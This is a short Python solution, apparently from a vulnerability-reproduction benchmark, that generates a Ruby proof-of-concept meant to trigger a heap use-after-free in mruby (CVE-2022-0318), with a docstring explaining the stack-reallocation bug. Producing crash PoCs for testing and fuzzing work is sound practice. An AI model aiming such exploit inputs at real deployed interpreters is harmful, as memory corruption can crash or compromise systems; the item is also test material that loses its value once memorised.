import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in mruby (CVE-2022-0318).

        The vulnerability exists in the creation of `Proc` objects. When a `Proc`
        is created, it captures its lexical environment, which includes local
        variables from the current stack frame. To store this captured
        environment, space is allocated on the VM stack.

        If the number of captured variables is large enough, this allocation can
        exceed the current stack capacity, triggering a call to `mrb_stack_extend()`.
        This function reallocates the stack buffer to a new, larger memory region
        and frees the old one.

        The vulnerability is that after this reallocation, a pointer (`proc->env->stack`)
        within the newly created `Proc` object is not updated to point to the new
        stack location. It continues to point to the old, now-freed stack memory.

        When the `Proc` is later called, it uses this stale pointer to access its
        captured environment, resulting in a read from freed memory—a classic
        Heap Use After Free.

        This PoC triggers the vulnerability by:
        1. Defining a method `trigger`.
        2. Inside `trigger`, declaring a large number of local variables. The number
           is chosen to be greater than mruby's default initial stack size
           (MRB_STACK_INIT_SIZE = 128) to reliably force a stack extension. We use 150
           as a safe margin.
        3. Creating a `Proc` that uses all these local variables, thus capturing them.
           This action is what triggers the `mrb_stack_extend` call and the bug.
        4. Calling the `Proc`, which then uses the dangling pointer, causing a crash
           that is detectable by AddressSanitizer.
        """
        
        num_vars = 150

        var_names = [f"v{i}" for i in range(num_vars)]
        var_defs = [f"{name}={i}" for i, name in enumerate(var_names)]

        defs_line = "; ".join(var_defs)
        sum_expr = " + ".join(var_names)

        poc_lines = [
            "def trigger",
            f"  {defs_line}",
            f"  p = Proc.new {{ {sum_expr} }}",
            "  p.call",
            "end",
            "trigger"
        ]
        
        poc_script = "\n".join(poc_lines)

        return poc_script.encode('utf-8')